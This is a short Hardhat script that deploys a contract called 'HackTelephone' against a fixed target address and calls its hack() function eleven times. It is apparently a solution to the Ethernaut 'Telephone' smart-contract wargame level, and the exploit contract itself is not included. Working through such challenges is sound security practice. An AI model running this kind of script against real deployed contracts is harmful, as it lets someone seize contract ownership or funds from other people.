const main = async () => {
  const hackTelephoneFactory = await hre.ethers.getContractFactory("HackTelephone"),
  hackContract = await hackTelephoneFactory.deploy("0xE681d8234A3a3217B8c2478a7a29a44428Ef442b");
  await hackContract.deployed();
  console.log("Contract deployed to: " + hackContract.address);

  for(let i = 0; i <= 10; i++){
    let txn = await hackContract.hack();
    await txn.wait();
  }
}

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
};

runMain();
